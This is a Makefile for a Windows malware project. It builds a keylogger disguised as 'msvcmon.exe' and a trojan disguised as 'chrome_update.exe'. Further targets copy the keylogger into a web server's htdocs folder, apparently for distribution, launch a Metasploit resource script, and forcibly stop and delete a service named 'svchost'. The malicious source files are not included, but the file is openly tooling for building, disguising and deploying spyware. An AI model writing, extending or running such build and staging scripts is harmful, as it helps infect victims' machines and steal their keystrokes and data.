CC = clang
CFLAGS = -Wall -Wextra -O2

LDFLAGS_COMMON = -luser32 -lgdi32 -lkernel32
LDFLAGS_TROJAN = -lwininet -lole32 -lshell32 -static
LDFLAGS_B64 = -lcrypt32

SRC_DIR = src
BUILD_DIR = build
OUTPUT_DIR = bin

EXEC_MSCVMON = $(OUTPUT_DIR)/msvcmon.exe
EXEC_CHROME_UPDATE = $(OUTPUT_DIR)/chrome_update.exe
EXEC_B64TOOL = $(OUTPUT_DIR)/b64tool.exe

SRC_MSCVMON = $(SRC_DIR)/kylg_winapi.c
SRC_TROJAN = $(SRC_DIR)/trojan.c
SRC_B64TOOL = $(SRC_DIR)/b64tool.c

all: $(EXEC_MSCVMON) $(EXEC_CHROME_UPDATE) $(EXEC_B64TOOL)

$(OUTPUT_DIR):
	mkdir -p $(OUTPUT_DIR)

$(EXEC_MSCVMON): $(SRC_MSCVMON) | $(OUTPUT_DIR)
	$(CC) $(CFLAGS) $< -o $@ $(LDFLAGS_COMMON)

$(EXEC_CHROME_UPDATE): $(SRC_TROJAN) | $(OUTPUT_DIR)
	$(CC) $(CFLAGS) $< -o $@ $(LDFLAGS_TROJAN)

$(EXEC_B64TOOL): $(SRC_B64TOOL) | $(OUTPUT_DIR)
	gcc $(CFLAGS) $< -o $@ $(LDFLAGS_B64)


.PHONY: move
move:
	mv "$(OUTPUT_DIR)/msvcmon.exe" "F:/command/xampp/htdocs/msvcmon.exe"

.PHONY: cmake-build
cmake-build:
	cmake -S . -B $(BUILD_DIR) -G "MinGW Makefiles" -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++
	cmake --build $(BUILD_DIR)

.PHONY: msfrun
msfrun:
	msfconsole -r msfcrun.rc

.PHONY: clean
clean:
	rm -rf $(OUTPUT_DIR) $(BUILD_DIR)

.PHONY: get_service
get_service:
	Get-Service -Name "svchost"

.PHONY: stop_service
stop_service:
	Stop-Service -Name "svchost" -Force

.PHONY: delete_service
delete_service:
	sc delete "svchost"

.PHONY: search_service
search_services:
	Get-Process svchost | Select-Object Id, ProcessName, Path
